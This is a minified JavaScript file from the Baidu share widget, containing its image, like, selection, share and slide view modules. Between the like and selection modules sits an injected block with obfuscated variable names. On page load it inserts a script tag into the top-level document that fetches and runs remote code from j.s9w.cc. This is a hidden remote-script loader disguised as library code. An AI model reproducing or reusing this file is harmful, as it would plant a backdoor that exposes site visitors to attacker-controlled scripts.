window._bd_share_main.F.module("view/image_view",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("conf/const"),o=e("view/view_base");t.View=i.create(function(e){function l(){var t=e.tag||"";r("img").each(function(e,n){if(!t||r(n).attr(s.CONFIG_TAG_ATTR)==t){if(r(n).attr("data-bd-imgshare-binded")==1)return;r(n).on("mouseenter",c).on("mouseleave",h),r(n).attr("data-bd-imgshare-binded",1)}})}function c(e){var t=e.target;p(t)&&(f.element=t,f.start())}function h(){f.abort()}function p(t){var n=!0;if(e.bdMinHeight&&e.bdMinHeight>t.offsetHeight)n=!1;else if(e.bdMinWidth&&e.bdMinWidth>t.offsetWidth)n=!1;else if(t.offsetWidth<100||t.offsetHeight<100)n=!1;return n}function d(e){e&&w(function(){g(e),i.show(),o=!1,u=e})}function v(){o||i.hide()}function m(){return i.find(".bdimgshare-icon")}function g(t){if(e.viewType=="list"){var n={16:{lbl:53,pright:8,item:18},24:{lbl:57,pright:8,item:28},32:{lbl:61,pright:8,item:38}},s=n[e.viewSize],o=Math.floor((t.offsetWidth-s.lbl-s.pright-10)/s.item),u=m();for(var a=0,f=u.length-1;a<f;a++)a<o-1?r(u[a]).show():r(u[a]).hide()}var l={width:i.offsetWidth,height:i.offsetHeight},c={width:t.offsetWidth,height:t.offsetHeight},h=y(r(t).offset(),c,l),p={position:"absolute",top:h.top+"px",left:h.left+"px"};e.viewType=="list"&&(p.width=c.width+"px"),i.css(p)}function y(t,n,r){return e.viewType=="list"?{top:t.top+(e.viewPos=="bottom"?n.height-r.height:0),left:t.left}:e.viewType=="collection"?{top:t.top+(e.viewPos.toLowerCase().indexOf("bottom")>-1?n.height-r.height-5:5),left:t.left+(e.viewPos.toLowerCase().indexOf("left")>-1?5:n.width-r.width-5)}:{top:t.top+(e.viewPos=="bottom"?n.height-r.height:0),left:t.left+(n.width-r.width)}}function b(){var s=["<div id='#{id}' class='sr-bdimgshare sr-bdimgshare-#{type} sr-bdimgshare-#{size} sr-bdimgshare-#{color}' style='height:#{height}px;line-height:#{lineHeight}px;font-size:#{fontSize}px;width:#{width}px;display:none;'>","<div class='bdimgshare-bg'></div>","<div class='bdimgshare-content bdsharebuttonbox bdshare-button-style#{style}-#{size}'>","<label class='bdimgshare-lbl'>#{text}</label>","#{list}","</div>","</div>"].join(""),o="<a href='#' onclick='return false;' class='bds_#{icon}' data-cmd='#{icon}' hidefocus></a>",u=e.viewType=="list",a=[];u&&r.each(e.viewList,function(e,t){a.push(r.string(o).format({icon:t}))}),a.push(r.string(o).format({icon:"more"}));var l={16:"36",24:"42",32:"48"},c={16:"33",24:"39",32:"45"},h={16:"60",24:"71",32:"82"},p={16:"12",24:"14",32:"14"},d=r.string(s).format({id:n,text:e.viewText||(u?"\u56fe\u7247\u5206\u4eab":"\u5206\u4eab"),type:e.viewType,style:e.viewStyle,size:e.viewSize,color:e.viewColor,width:u?"auto":h[e.viewSize],height:(u?l:c)[e.viewSize],lineHeight:(u?l:c)[e.viewSize]-10,fontSize:p[e.viewSize],list:a.join("")});r("body").insertHTML("beforeEnd",d),t._entities=i=r("#"+n),i.on("mouseleave",function(){f.abort()}).on("mouseenter",function(){f.clearAbort()})}function w(t){if(e.bdCustomStyle){var n=document.createElement("link");n.href=e.bdCustomStyle,n.rel="styleSheet",n.type="text/css",n.onLoad=function(){t&&t()},document.getElementsByTagName("head")[0].appendChild(n)}else window._bd_share_main.F.use(["imgshare.css","share_style0_"+e.viewSize+".css"],function(){t&&t()})}var t=this,n="bdimgshare_"+(new Date).getTime(),i=null,o=!1,u=null,a=function(e){function i(){r&&(r=clearTimeout(r)),n||(n=setTimeout(function(){e.startFn&&e.startFn(),n=!1},e.time))}function s(){n&&(n=clearTimeout(n)),r||(r=setTimeout(function(){e.abortFn&&e.abortFn(),r=!1},e.time))}var t=this,n=!1,r=!1;t.clearAbort=function(){r&&(r=clearTimeout(r))},t.start=i,t.abort=s},f=new a({time:200,startFn:function(){d(f.element)},abortFn:function(){v()}});t.render=function(e){l(),b()},t._init=function(){},t._keepBarVisible=function(){f.clearAbort(),o=!0},t._getImageSrc=function(){return u.src},t._distory=function(){i.remove();var t=e.tag||"";r("img").each(function(e,n){if(!t||r(n).attr(s.CONFIG_TAG_ATTR)==t)r(n).off("mouseenter",c).off("mouseleave",h),r(n).removeAttr("data-bd-imgshare-binded")})}},o.ViewBase)});
window._bd_share_main.F.module("view/like_view",function(e,t,n){e("like.css");var r=e("base/tangram").T,i=e("base/class").Class,s=e("conf/const"),o=e("view/view_base"),u=e("component/animate"),a={btn:"bdlikebutton",innerBtn:"bdlikebutton-inner",add:"bdlikebutton-add",text:"bdlikebutton-text",count:"bdlikebutton-count"};t.View=i.create(function(e){function i(){var n=e.tag||"";return r("."+a.btn).each(function(e,i){(!n||r(i).attr(s.CONFIG_TAG_ATTR)==n)&&t._entities.push(i)}),t._entities}function o(){var t=e,r=n[t.type];return t.likeText=t.likeText?t.likeText.substr(0,r[0]):r[1],t.likedText=t.likedText?t.likedText.substr(0,r[0]):r[2],t}function f(e){return r(e).parent().get(0)}var t=this,n={small:[4,"\u9876","\u5df2\u9876\u8fc7"],medium:[6,"\u9876","\u60a8\u5df2\u9876\u8fc7"],large:[10,"\u8be5\u5185\u5bb9\u5bf9\u6211\u6709\u5e2e\u52a9","\u60a8\u5df2\u9876\u8fc7\uff0c\u8c22\u8c22\uff01"]};t.render=function(e){var n=i(),s=a.btn,u=o();t._actBtnSet.className=a.innerBtn,t._actBtnSet.tagName="div",t._actBtnSet.maxDomDepth=1,r(n).each(function(e,n){var i=u.type,o=[];o.push('<div class="',a.innerBtn,'" ',t._actBtnSet.cmdAttr,'="like">'),o.push('<span class="',a.add,'">+1</span>'),o.push('<div class="',a.count,'">\u52a0\u8f7d\u4e2d</div>'),"small"!=i&&o.push('<div class="',a.text,'">',u.likeText,"</div>"),o.push("</div>"),r(n).html(o.join("")).addClass(s+"-"+u.color).addClass(s+"-"+u.type).addClass(s+"-"+u.type+"-"+u.color)})},t._init=function(){var n=e,i=n.type;r(t._entities).each(function(e,t){var s=r("."+a.innerBtn,t);s.mouseover(function(e){e=r.event(e||window.event);var o=e.relatedTarget;s.contains(o)||("small"==i&&r("."+a.count,t).html(n.likeText),r(t).addClass(a.btn+"-"+n.type+"-"+n.color+"-hover"))}).mouseout(function(e){e=r.event(e||window.event);var o=e.relatedTarget;s.contains(o)||("small"==i?r("."+a.count,t).html(n.count):r("."+a.text,t).html(n.likeText),r(t).removeClass(a.btn+"-"+n.type+"-"+n.color+"-hover"))})})},t.showDoneState=function(t){var n=e,i=f(t),s=a.text;"small"==n.type&&(s=a.count),r("."+s,i).html(n.likedText),r(i).removeClass(i,a.btn+"-"+n.type+"-"+n.color+"-hover")},t.addOne=function(n,i){var s=e,o=f(n),l=r("."+a.add,o);l.show(),u.animate(l.get(0),{top:"-25px",opacity:"0"},300,function(){l.hide(),l.css({top:"0px",opacity:99})}),t.setNumber(i),r(o).removeClass(a.btn+"-"+s.type+"-"+s.color+"-hover")},t.setNumber=function(e){r.type(e)=="number"&&r(t._entities).each(function(t,n){r("."+a.count,n).html(e)})}},o.ViewBase)});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("view/select_view",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("conf/const"),o=e("view/view_base"),u,a,f,l,c=function(e){var t="";return document.selection?t=document.selection.createRange().text:t=document.getSelection(),r.string(t.toString()).trim()},h="getSelection"in document?function(){document.getSelection().removeAllRanges(),l=""}:function(){document.selection.empty(),l=""};t.View=i.create(function(e){function o(){if(e.bdCustomStyle){var t=document.createElement("link");t.href=e.bdCustomStyle,t.rel="styleSheet",t.type="text/css",document.getElementsByTagName("head")[0].appendChild(t)}else window._bd_share_main.F.use("share_style"+n+"_"+i+".css")}function p(e,n){var i=n.bdMini||2,s=n.bdSelectMiniList||t._partnerSort.slice(0,4),o=[];r.each(s,function(e,t){o[e]='<a href="#" class="bds_'+t+'" data-cmd="'+t+'"></a>'}),f.find(".bdselect_share_partners").html(o.join(""))}function d(e,t){var n=e.pageY,i=e.pageX;n+=5,i-=18;var s=u.outerHeight(),o=r(window).scrollTop();if(n+s>r("body").height()&&n+s>r(window).height()||n+s>o+r(window).height())n=e.pageY-s-5,n=n<o?o:n;var a=t.bdPopupOffsetLeft,f=t.bdPopupOffsetTop;if(a||f)n+=f|0,i+=a|0;return{top:n,left:i}}function g(e,n){var i=d(e,n);if(l.length<5){t.hide("less");return}r.each([u,a],function(e,t){t.css({top:i.top,left:i.left}).show(),n.bdText=c()});var s=f.find("a").length,o=r(f.find("a")).outerWidth(!0),h=o*s+20,p=parseInt(u.css("max-width"));p&&h>p&&(h=p),u.width(h),u.find(".bdselect_share_head").width(h),a.width(h),a.height(u.height());var g=u.find(".bdselect_share_dialog_search");g.attr("href","http://www.baidu.com/s?wd="+n.bdText+"&tn=SE_hldp08010_vurs2xrp");var y=m(function(){v("http://s.share.baidu.com/select?"+r.ajax.param({log_type:"click",content:encodeURIComponent(n.bdText)}))},100);g.click(y),h<220?u.find(".bdselect_share_dialog_search_span").hide():u.find(".bdselect_share_dialog_search_span").show(),v("http://s.share.baidu.com/select?"+r.ajax.param({log_type:"show",content:encodeURIComponent(n.bdText)}))}var t=this;t._container=null;var n=e.bdStyle||0,i="|16|24|32|".indexOf("|"+e.bdSize+"|")>-1?e.bdSize:16,s=!1;t._buttonType=0,t.render=function(){var s="bdSharePopup_selectshare"+ +(new Date),o=['<iframe frameborder="0" id="'+s+'bg" class="bdselect_share_bg" style="display:none;"></iframe>'].join(""),l=['<div id="'+s+'box" style="display:none;" share-type="selectshare" class="bdselect_share_box">','<div class="selectshare-mod-triangle"><div class="triangle-border"></div><div class="triangle-inset"></div></div>','<div  class="bdselect_share_head" ><span>\u5206\u4eab\u5230</span>','<a href="http://www.baidu.com/s?wd='+e.bdText+'&tn=SE_hldp08010_vurs2xrp"',' class="bdselect_share_dialog_search" target="_blank">','<i class="bdselect_share_dialog_search_i"></i>','<span class="bdselect_share_dialog_search_span">\u767e\u5ea6\u4e00\u4e0b</span></a>','<a class="bdselect_share_dialog_close"></a></div>','<div class="bdselect_share_content" >','<ul class="bdselect_share_list">','<div class="bdselect_share_partners"></div>','<a href="#" class="bds_more"  data-cmd="more"></a>',"</ul>","</div>","</div>"].join("");r("body").insertHTML("beforeEnd",o+l),t._container=u=r("#"+s+"box"),f=u.find(".bdselect_share_list").addClass("bdshare-button-style"+n+"-"+i),a=r("#"+s+"bg"),t._entities.push(u),r(".bdselect_share_dialog_close").click(t.hide)},t.hide=function(e){e||h(),a&&a.hide(),u&&u.hide()},t._init=function(){var n;e.bdContainerClass?n=r("."+e.bdContainerClass):n=r("body").children(),r("body").on("mouseup",function(i){n.each(function(n,s){s==i.target||r(s).contains(i.target)||!e.bdContainerClass&&i.target==document.body?setTimeout(function(){l=c(),o(),t.show(i,e)},10):u.css("display")=="block"&&t.hide()})})},t.show=function(e,n){window._bd_share_main.F.use(["component/partners","share_popup.css","select_share.css"],function(r){t._partnerSort=r.partnerSort,s||(p(t._container,n),s=!0),g(e,n)})};var v=function(){var e={};return function(t){var n="bdsharelog__"+(new Date).getTime(),r=e[n]=new Image;r.onload=r.onerror=function(){e[n]=null},r.src=t+"&t="+(new Date).getTime(),r=null}}(),m=function(e,t,n){var r,i,s,o=null,u=0;n||(n={});var a=function(){u=n.leading===!1?0:new Date,o=null,s=e.apply(r,i),o||(r=i=null)};return function(){var f=new Date;!u&&n.leading===!1&&(u=f);var l=t-(f-u);return r=this,i=arguments,l<=0||l>t?(clearTimeout(o),o=null,u=f,s=e.apply(r,i),o||(r=i=null)):!o&&n.trailing!==!1&&(o=setTimeout(a,l)),s}};t._distory=function(){u.remove(),a.remove()}},o.ViewBase)});
window._bd_share_main.F.module("view/share_view",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("conf/const"),o=e("view/view_base"),u={btn:"bdsharebuttonbox",count:"bds_count"};t.View=i.create(function(e){function o(){var o=e.tag||"";return r("."+u.btn).each(function(e,u){if(!o||r(u).attr(s.CONFIG_TAG_ATTR)==o)t._entities.push(u),r(u).removeClass(function(e,t){var n=t.match(/bdshare-button-style\d*-\d*/g);if(n)return n.join(" ")}),r(u).addClass("bdshare-button-style"+n+"-"+i)}),t._entities}function a(){if(e.bdCustomStyle){var t=document.createElement("link");t.href=e.bdCustomStyle,t.rel="styleSheet",t.type="text/css",document.getElementsByTagName("head")[0].appendChild(t)}else window._bd_share_main.F.use("share_style"+n+"_"+i+".css")}function f(){r("."+u.btn).each(function(e,t){r(t).children("a,span").each(function(e,t){var n=r(t).attr(s.CMD_ATTR);n&&window._bd_share_main.F.use("component/partners",function(e){var i=e.partners,s=i[n]?"\u5206\u4eab\u5230"+i[n].name:"";!r(t).attr("title")&&s&&r(t).attr("title",s)})})})}var t=this,n=e.bdStyle||0,i="|16|24|32|".indexOf("|"+e.bdSize+"|")>-1?e.bdSize:16;t._buttonType=0,t.render=function(e){o(),f()},t._init=function(){a(),r(t._entities).find("."+u.count).length>0&&t.fire("getsharecount")},t.setNumber=function(e,n){r(t._entities).find("."+u.count).html(n).attr("title","\u7d2f\u8ba1\u5206\u4eab"+e+"\u6b21")}},o.ViewBase)});
window._bd_share_main.F.module("view/slide_view",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("conf/const"),o=e("view/view_base"),u={box:"bdshare-slide-button-box",btn:"bdshare-slide-button"};t.View=i.create(function(e){function p(){window._bd_share_main.F.use("slide_share.css",function(){var t=i.width()||24;i.css(e.bdPos=="right"?"left":"right",-t),n&&n.css({top:e.bdTop|0,width:0,"z-index":99999}).css(e.bdPos,0).show(),o.width(0).hide(),a.width(h),f.width(h)})}function d(){if(l)return;a.html()||window._bd_share_main.F.use("component/partners",function(e){partnerSort=e.partnerSort,partners=e.partners,m(partnerSort,partners)});var e={};window._bd_share_main.F.use("component/animate",function(e){o.show(),e.animate(n[0],{width:h},300,function(){l=!0},function(e){o.width(e*h)})})}function v(){if(!l)return;var e={};window._bd_share_main.F.use("component/animate",function(e){e.animate(n[0],{width:0},300,function(){l=!1,o.hide()},function(e){o.width((1-e)*h)})})}function m(t,n){var i=e.bdMiniList||t.slice(0,8*c),s=[];r.each(i,function(e,t){if(!/(iPhone | iPad | Android)/i.test(navigator.userAgent)||t!=="weixin")s[e]='<li><a href="#" onclick="return false;" class="slide-'+t+'" data-cmd="'+t+'">'+n[t].name+"</a></li>"}),a.html(s.join(""))}var t=this,n,i,s,o,a,f,l=!1;t._buttonType=1;var c=e.bdMini||2,h=c*110+6,e=r.extend({},e);t.render=function(){var l=u.btn,c=u.box+" bdshare-slide-style-"+(e.bdPos=="right"?"r":"l")+e.bdImg,h=['<div class="'+c+'" style="display:none;">','<a href="#" onclick="return false;" class="'+l+'"></a>','<div class="bdshare-slide-list-box">','<div class="bdshare-slide-top">\u5206\u4eab\u5230</div>','<div class="bdshare-slide-list">','<ul class="bdshare-slide-list-ul"></ul>',"</div>",'<div class="bdshare-slide-bottom">','<a href="#" onclick="return false;" class="slide-more"  data-cmd="more">\u66f4\u591a...</a>',"</div>","</div>","</div>"].join("");n=r(h).appendTo("body"),i=n.find("."+u.btn),o=n.find(".bdshare-slide-list-box"),a=n.find(".bdshare-slide-list-ul"),s=n.find(".bdshare-slide-list"),f=n.find(".bdshare-slide-bottom"),p(),t._entities.push(n);if(r.browser.ie==6){n.css("position","absolute");var d=parseInt(n.css("top"));setInterval(function(){var t=(e.bdTop|0)+r(window).scrollTop();d!=t&&window._bd_share_main.F.use("component/animate",function(e){e.animate(n[0],{top:t},300)})},1e3)}},t._init=function(){var e=!1;i.on("mouseenter click",d),n.on("mouseleave click",v),r("body").click(function(e){n.contains(e.target)||v()})},t._distory=function(){n.remove()}},o.ViewBase)});
window._bd_share_main.F.module("view/view_base",function(e,t,n){var r=e("base/tangram").T,i=e("conf/const"),s=e("base/class").Class;t.ViewBase=s.create(function(e){function s(e){r(e).click(function(i){if(r(e).attr("data-bd-bind")==n){var s=o(i.target);s&&(i.preventDefault(),t.fire("clickact",{cmd:r(s).attr(t._actBtnSet.cmdAttr),element:s,event:i,buttonType:t._poptype}))}}).mouseenter(function(i){if(r(e).attr("data-bd-bind")==n){var s=o(i.target);t.fire("mouseenter",{element:s,event:i})}}).mousemove(function(i){if(r(e).attr("data-bd-bind")==n){var s=o(i.target);r(s).hasClass("bds_more")&&t.fire("moreover",{element:s})}}),r(e).attr("data-bd-bind",n)}function o(e){if(u(e))return e;if(t._actBtnSet.maxDomDepth>0){var n=t._actBtnSet.maxDomDepth,i=0,s=r(e).parent().get(0),o=t.entities;while(i<n){if(u(s))return s;s=r(s).parent().get(0);if(r.array(o).contains(s)||s==document.body)break;i++}}return null}function u(e){var n=t._actBtnSet;return e&&e.tagName&&(n.className||n.tagName)?(!n.className||r(e).hasClass(n.className))&&(!n.tagName||n.tagName.toLowerCase().indexOf("|"+e.tagName.toLowerCase()+"|")>-1)&&r(e).attr(n.cmdAttr):!1}var t=this,n=+(new Date);t._entities=[],t._buttonType=-1,t._actBtnSet={className:"",tagName:"|a|img|span",maxDomDepth:0,cmdAttr:i.CMD_ATTR},t.render=function(e){},t.init=function(){r(t._entities).each(function(e,t){s(t)}),t._init(),t._entities.length>0&&(_bd_share_main._LogPoolV2==_bd_share_main._LogPoolV2||[],_bd_share_main._LogPoolV2.push(e.type))},t._init=function(){},t.distory=function(){r(t._entities).removeAttr("data-bd-bind"),t._distory()},t._distory=function(){}})});